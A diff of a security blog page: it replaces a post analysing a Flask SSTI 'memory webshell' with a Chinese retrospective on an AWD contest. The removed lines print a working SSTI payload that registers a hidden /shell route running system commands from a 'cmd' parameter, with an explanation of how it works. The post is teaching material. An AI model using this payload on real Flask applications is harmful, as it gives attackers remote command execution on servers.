@@ -17,24 +17,20 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>Analysis of flask memory webshell | Polo&#39;s Blog</title>
-  <meta name="description" content="NOTICEBefore analysis , I assumed that you know the princple of SSTI and now how to find the exploit chain.You should know  url_for.__globals__ could find global variables in current app. Introduction">
+  <title>绿城杯AWD总结 | Polo&#39;s Blog</title>
+  <meta name="description" content="前言这次打绿城杯代价挺大的，改签机票提前住了一晚宾馆，在高铁站打了一天初赛；进了线下学校不报销路费，来回平均一个人1500块，一共去了四个人。最后的结果是上午CTF一分没拿，下午AWD打到了第九名，总体排名还是没有排到前9，只给了优胜奖。撇去自身实力原因外，我想吐槽组委会：为什么本来说只有AWD结果上午打CTF?说是CTF&#x2F;AWD分值一比一，是否严格履行？你线下AWD搞个CTF是什么意思？防止PY">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Analysis of flask memory webshell">
-<meta property="og:url" content="https://polosec.github.io/2021/09/24/Analysis-of-flask-memory-webshell/index.html">
+<meta property="og:title" content="绿城杯AWD总结">
+<meta property="og:url" content="https://polosec.github.io/2021/10/15/%E7%BB%BF%E5%9F%8E%E6%9D%AFAWD%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="Polo&#39;s Blog">
-<meta property="og:description" content="NOTICEBefore analysis , I assumed that you know the princple of SSTI and now how to find the exploit chain.You should know  url_for.__globals__ could find global variables in current app. Introduction">
+<meta property="og:description" content="前言这次打绿城杯代价挺大的，改签机票提前住了一晚宾馆，在高铁站打了一天初赛；进了线下学校不报销路费，来回平均一个人1500块，一共去了四个人。最后的结果是上午CTF一分没拿，下午AWD打到了第九名，总体排名还是没有排到前9，只给了优胜奖。撇去自身实力原因外，我想吐槽组委会：为什么本来说只有AWD结果上午打CTF?说是CTF&#x2F;AWD分值一比一，是否严格履行？你线下AWD搞个CTF是什么意思？防止PY">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://cdn.polowong.top/163249208767051gyctei.png?imageslim">
-<meta property="og:image" content="http://cdn.polowong.top/1632494776728fam272p6.png?imageslim">
-<meta property="og:image" content="http://cdn.polowong.top/1632495118141e8t9fc9j.png?imageslim">
-<meta property="article:published_time" content="2021-09-24T13:16:39.000Z">
-<meta property="article:modified_time" content="2021-09-24T14:56:49.000Z">
+<meta property="article:published_time" content="2021-10-14T17:07:20.000Z">
+<meta property="article:modified_time" content="2021-10-14T17:13:11.947Z">
 <meta property="article:author" content="Polo">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://cdn.polowong.top/163249208767051gyctei.png?imageslim">
   <!-- Canonical links -->
-  <link rel="canonical" href="https://polosec.github.io/2021/09/24/Analysis-of-flask-memory-webshell/index.html">
+  <link rel="canonical" href="https://polosec.github.io/2021/10/15/%E7%BB%BF%E5%9F%8E%E6%9D%AFAWD%E6%80%BB%E7%BB%93/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Polo&#39;s Blog" type="application/atom+xml">
   
@@ -295,14 +291,14 @@
   
 <main class="main" role="main">
   <div class="content">
-  <article id="post-Analysis-of-flask-memory-webshell" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <article id="post-绿城杯AWD总结" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
     <div class="article-header">
       
         
   
     <h1 class="article-title" itemprop="name">
-      Analysis of flask memory webshell
+      绿城杯AWD总结
     </h1>
   
 
@@ -310,8 +306,8 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2021/09/24/Analysis-of-flask-memory-webshell/" class="article-date">
-	  <time datetime="2021-09-24T13:16:39.000Z" itemprop="datePublished">2021-09-24</time>
+	<a href="/2021/10/15/%E7%BB%BF%E5%9F%8E%E6%9D%AFAWD%E6%80%BB%E7%BB%93/" class="article-date">
+	  <time datetime="2021-10-14T17:07:20.000Z" itemprop="datePublished">2021-10-15</time>
 	</a>
 </span>
         
@@ -326,33 +322,34 @@
 	</span>
 
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/09/24/Analysis-of-flask-memory-webshell/#comments" class="article-comment-link">Comments</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/10/15/%E7%BB%BF%E5%9F%8E%E6%9D%AFAWD%E6%80%BB%E7%BB%93/#comments" class="article-comment-link">Comments</a></span>
         
 	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 504(words)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 816(words)</span>
 	
 	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 3(minutes)</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 2(minutes)</span>
 	
 
       </div>
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <h1 id="NOTICE"><a href="#NOTICE" class="headerlink" title="NOTICE"></a>NOTICE</h1><p>Before analysis , I assumed that you know the princple of SSTI and now how to find the exploit chain.You should know  url_for.__globals__ could find global variables in current app.</p>
-<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>In the previous passage I’ve introduced memory webshell in flask and implemented it,so in this passage I’ll analyse the procedure of a web request which request flask and make sense how to generate a memory shell.</p>
-<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>This is a EXP in Flask SSTI vulnerability which could register a route and execute system command.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](</span><br><span class="line">	&quot;app.add_url_rule(</span><br><span class="line">		&#39;&#x2F;shell&#39;, </span><br><span class="line">		&#39;shell&#39;, </span><br><span class="line">		lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</span><br><span class="line">		)</span><br><span class="line">	&quot;,</span><br><span class="line">	&#123;</span><br><span class="line">		&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],</span><br><span class="line">		&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-<p>There are some complex functions and variables in the PoC,I’ll explain it.<br>From SSTI we can reach eval function to execute python command,such as eval(“__import__(‘os’).popen(‘whoami’).read()”)<img src="http://cdn.polowong.top/163249208767051gyctei.png?imageslim" alt="paste image"><br>function add_url_rule() is used for adding route,such as add route in flask app.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_url_rule(rule, endpoint&#x3D;None, view_func&#x3D;None, provide_automatic_options&#x3D;None, **options)</span><br></pre></td></tr></table></figure>
-<p>Briefly,we can pass parameter to this function to register route and define the handle function.<br>Usually we can pass(‘/shell’,’shell’,lambda:xxxx_lambda_function_code) to this function to register a route /shell and define the handle founction.<br>In this demo,the lambda function could receive parameter from front-end and execute system command.It looks like this:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.add_url_rule(</span><br><span class="line">		&#39;&#x2F;shell&#39;, </span><br><span class="line">		&#39;shell&#39;, </span><br><span class="line">		lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</span><br><span class="line">		)</span><br><span class="line">        </span><br></pre></td></tr></table></figure>
-<p> This lambda function could receive and handle the parameter passed from front-end and execute it.Until now I  didn’t explain variables like request_ctx_stack 、app、current_app.</p>
-<p> request_ctx_stack like a stack structure, every web request will be pushed into this stack and pop 、handle it.<br>So, in this EXP it(request_ctx_stack.top) represents the current request object,just like in your flask app’s every handle function in route to handle the current request!</p>
-<p>request.args.get() is used for get the parameter’s value from front-end,juset need the parameter name and the default value is whoami in this EXP.</p>
-<p>In eval function, we noticed that there is a variable called app, but now we don’t now what is app.But we know that we can pass parameters and values by eval via dict format in python, so we can pass paramater what we used like app,request_ctx_stack.</p>
-<p>We  have analysed  all the EXP, so we can generate a memory webshell now:)<br><img src="http://cdn.polowong.top/1632494776728fam272p6.png?imageslim" alt="paste image">no new route was found in source code:)<img src="http://cdn.polowong.top/1632495118141e8t9fc9j.png?imageslim" alt="paste image"></p>
-<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p> <a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/">https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/</a><br> <a target="_blank" rel="noopener" href="https://segmentfault.com/blog/myflask">https://segmentfault.com/blog/myflask</a><br> <a target="_blank" rel="noopener" href="https://www.cnblogs.com/bigox/p/11652859.html">https://www.cnblogs.com/bigox/p/11652859.html</a><br> <a target="_blank" rel="noopener" href="https://englndcib.blogspot.com/2021/08/python-lambda.html">https://englndcib.blogspot.com/2021/08/python-lambda.html</a></p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次打绿城杯代价挺大的，改签机票提前住了一晚宾馆，在高铁站打了一天初赛；进了线下学校不报销路费，来回平均一个人1500块，一共去了四个人。最后的结果是上午CTF一分没拿，下午AWD打到了第九名，总体排名还是没有排到前9，只给了优胜奖。撇去自身实力原因外，我想吐槽组委会：为什么本来说只有AWD结果上午打CTF?说是CTF/AWD分值一比一，是否严格履行？你线下AWD搞个CTF是什么意思？防止PY上午不禁止去厕所，下午AWD却禁止去厕所，谁AWD还有空去PY？消息通知混乱，到了郑州才知道要做核酸，获奖队伍少，奖金少，无现金，只有E卡。我愿称之为全国最穷国家网络安全宣传周活动。<br>下面说我在比赛中返的一些错误。上午CTF，本人菜，没啥好说的。</p>
+<h1 id="致命"><a href="#致命" class="headerlink" title="致命"></a>致命</h1><p>AWD流程环节出现严重问题。赛前演练四个人的配合中都没有演练到文件监控脚本的使用，导致被别人种了不死马掉大分。在监控不到流量、pwn题下线、web一直被打的情况下当时没有想到不死马这个事情，是我疏忽了。上了文件监控脚本后再也没失分。（自动删除不死马及任何新上传的文件，无crontab，这里需要注意的是，<strong>比赛的时候我忘记crontab路径了，只能看当前user，但shell的权限大部分是www-data需要加强记忆</strong>）</p>
+<h1 id="严重"><a href="#严重" class="headerlink" title="严重"></a>严重</h1><p>脚本编写能力过差。当队友通过流量抓取到漏洞利用方式时，经我验证后应该迅速写出批量利用脚本，在这个地方卡住了，导致写脚本写的比较慢，应该是丢掉了许多分数。</p>
+<p>无法自动提交flag。安恒的HTTPS流量不知道为啥抓不到，没有办法用脚本自动提交flag。</p>
+<p>无法进一步利用已知漏洞种植不死马。这导致丢了很多分数</p>
+<p>赛时脚本结构混乱，应将功能点分开，RCE利用和种马应同时尝试进行，利用马getflag的操作应该在另一个文件中。多线程尚未熟练掌握</p>
+<p>AOIAWD赛前未成功部署，仅靠watchbird总是感觉力不从心。</p>
+<h1 id="轻微"><a href="#轻微" class="headerlink" title="轻微"></a>轻微</h1><p>赛时紧张，对待队友的态度有时过激。</p>
+<h1 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h1><p>1.提高脚本编写能力，掌握多线程，优化脚本结构</p>
+<p>2.在AWD演练中尝试使用RCE漏洞种植不死马并getflag。</p>
+<p>3.本地部署AOIAWD</p>
+<p>4.crontab路径熟记，防止有人写crontab。</p>
+<p>5.模拟时严格演练流程，优化分工。</p>
+<p>6.应正确对待队友，克制自己的情绪。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这次我有点拉跨，不过队友的表现很好，能各司其职的负责我所分配的认为（流量、赛题监控、备份与恢复、杀毒、流量告警等）我认为我的队友第一次打线下AWD能做到这种程度比我强太多了。下次AWD一定拿下！</p>
 
       
     </div>
@@ -365,7 +362,7 @@
       <p style="width: 100%;
   word-wrap: break-word;
   word-break: break-all;
-  overflow: hidden;">https://polosec.github.io/2021/09/24/Analysis-of-flask-memory-webshell/</p>
+  overflow: hidden;">https://polosec.github.io/2021/10/15/%E7%BB%BF%E5%9F%8E%E6%9D%AFAWD%E6%80%BB%E7%BB%93/</p>
     </li>
     
     <li class="post-copyright-license">
@@ -411,13 +408,9 @@
   
   <ul class="pager pull-left">
     
-    <li class="prev">
-      <a href="/2021/10/07/%E7%BB%BF%E5%9F%8E%E6%9D%AF%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="绿城杯流量分析"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
-    </li>
-    
     
     <li class="next">
-      <a href="/2021/09/05/webshell-in-flask/" title="implementation of memory webshell in flask"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+      <a href="/2021/10/09/Traffic-analysis-in-Lvcheng-Cup/" title="Traffic analysis in Lvcheng Cup"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
     
     
